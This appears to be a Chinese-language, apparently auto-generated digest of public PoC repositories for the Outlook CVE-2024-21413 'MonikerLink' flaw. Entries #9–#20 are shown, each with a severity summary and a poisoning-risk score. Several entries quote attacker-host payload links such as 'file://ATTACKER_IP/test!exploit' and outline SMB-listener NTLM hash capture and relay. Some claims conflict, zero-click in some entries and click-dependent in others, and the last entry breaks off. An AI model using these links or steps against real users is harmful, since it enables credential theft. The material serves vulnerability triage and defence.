
## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

